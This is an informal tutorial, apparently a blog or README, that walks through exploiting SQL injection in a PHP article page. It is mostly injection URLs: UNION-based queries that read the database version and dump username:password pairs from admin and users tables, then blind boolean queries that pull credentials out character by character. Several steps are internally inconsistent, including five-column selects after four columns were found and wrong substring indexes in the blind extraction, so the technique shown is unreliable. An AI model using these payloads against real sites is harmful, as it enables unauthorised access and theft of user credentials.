

# Introducing The SQL Injection Vuln:

SQL injection attacks are known also as SQL insertion

it's in the form of executing some querys in the database and getting acces to informations (SQL Vesion, Number & Names of tables and columns,some authentification infos,ect...)

# Exploiting Sql Injection Vuln :

1. Before proceeding to the exploitation of sql injections we have to checking for this vulnerability, so we have an example

	a. `http://www.website.com/articles.php?id=3`

2. for checking the vulnerability we have to add ' (quote) to the url , lets see together

	a. `http://www.website.com/articles.php?id=3'`

3. now, if we get an error like this `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc...`, this website is vulnerable to sql injection, and if we don't get anything we can't exploiting this vulnerability.

4. Now, Lets go to exploiting this vuln and finding some informations about this sql database


# certainly before doing anything we have to find the number of columns

**Finding the number of columns:**

1. for finding the number of columns we use `ORDER BY` to order result in the database

	a. `http://www.website.com/articles.php?id=3 order by 1/*`

2. and if we havn't any error we try to change the number

	a. `http://www.website.com/articles.php?id=3 order by 2/*`

3. still no error,so we continu to change the number

	a. `http://www.website.com/articles.php?id=3 order by 3/*`

4. no error to

	a. `http://www.website.com/articles.php?id=3 order by 4/*`

5. no error

	a. `http://www.website.com/articles.php?id=3 order by 5/*`

6. yeah , here we have this error (Unknown column '5' in 'order clause'), so this database has 4 columns because the error is in the 5

7. now, we try to check that UNION function work or not

# Checking UNION function :

**for using UNION function we select more informations from the database in one statement**

1. so we try this

	a. `http://www.website.com/articles.php?id=3 union all select 1,2,3,4/*`
	
	b. in the end it's 4 because we have see the number of columns it's 4

2. now, if we see some numbers in the page like `1 or 2 or 3 or 4 ==` then the UNION function work
	
	a. if it not work we try to change the `/*` to `--` so we have this `http://www.website.com/articles.php?id=3 union all select 1,2,3,4--`

5. after checking the UNION function and it works good we try to get SQL version

# Getting SQL Version :

**now we have a number in the screen after checking the UNION
we say in example that this number is 3

1. so we replace 3 with @@version or version()

	a. `http://www.website.com/articles.php?id=3 union all select 1,2,@@version,4/*`

2. and now we have the version in the screen!

3. lets go now to get tables and columns names


# Getting tables and columns names :

**here we have a job to do!!**
if the MySQL Version is < 5 (i.e 4.1.33, 4.1.12...)

1. lets see that the table admin exist!

 a. `http://www.website.com/articles.php?id=3 union all select 1,2,3,4,5 from admin/*`

2. and here we see the number 3 that we had in the screen now, we knows that the table admin exists

3. here we had to check column names:

	a. `http://www.website.com/articles.php?id=3 union all select 1,2,username,4,5 from admin/*`

4. if we get an error we have to try another column name, and if it work we get username displayed on screen (example: admin,moderator,super moderator...)

5. after that we can check if column password exists, we have this

	a. `http://www.website.com/articles.php?id=3 union all select 1,2,password,4,5 from admin/*`

6. and oups! we see password on the screen in a hash or a text, now we have to use 0x3a for having the informations like that username:password ,dmin:unhash...

	a. `http://www.website.com/articles.php?id=3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*`

7. this is the sample SQL Injection , now, we will go to the blind sql injection (more difficult)


# Exploiting Blind SQL Injection Vuln :

1. first we should check if website is vulnerable for example

	a. `http://www.website.com/articles.php?id=3`

2. test the vulnerability we had to use

	a. `http://www.website.com/articles.php?id=3 and 1=1 ( we havn't any error and the page loads normally)`

3. and now

	a. `http://www.website.com/articles.php?id=3 and 1=2`

4. here we have some problems with text, picture and some centents ! and it's good! this website is vulnerable for Blind SQL Injection we have to check MySQL Version

# Getting MySQL Version :

1. we use substring in blind injection to get MySQL Version

	a. `http://www.website.com/articles.php?id=3 and substring(@@version,1,1)=4`

2. we should replace the 4 with 5 if the version is 5

	a. `http://www.website.com/articles.php?id=3 and substring(@@version,1,1)=5`

3. and now if the function select do not work we should use subselect and we should testing if it work

# Testing if subselect works :

`http://www.website.com/articles.php?id=3 and (select 1)=1` ( if the page load normally the subselect works good)

1. and now we have to see if we have access to mysql.user

	a. `http://www.website.com/articles.php?id=3 and (select 1 from mysql.user limit 0,1)=1` (if it load normally we have access to mysql.user)

2. now, we can checking table and column names

# Checking table and column names :

`http://www.website.com/articles.php?id=3 and (select 1 from users limit 0,1)=1`

1. if the page load normaly and no errors the table users exists

  a. now we need column name

  b. `http://www.website.com/articles.php?id=3 and (select substring(concat(1,password),1,1) from users limit 0,1)=1`

2. the page load normaly and no errors the column password exists

  a. now we have the table and the column , yeah, we can exploiting the vunlnerability now

  b. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80`

3. the page load normaly and no errors,so we need to change the 80 for having an error

  a. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>90`

  b. `no errors ! we continu`

4. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99`

  a. Yeah!! an error

  b. the character is char(99). we use the ascii converter and we know that char(99) is letter 'c'

5. to test the second character we change ,1,1 to ,2,1

  a. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99`

  b. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99`

6. the page load normaly

  a. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104`

7. the page loads normally, higher !!!

  a. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107`

8. error ! lower number

  a. `http://www.website.com/articles.php?id=3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105`

9. Error That we search!!

10. now, we know that the second character is char(105) and that is 'i' with the ascii converter. We have 'ci' now from the first and the second charactets


our tutorial draws to the close!

Thanks you for reading and i hope that you have understand SQL Injection and exploitations of this vulnerability .
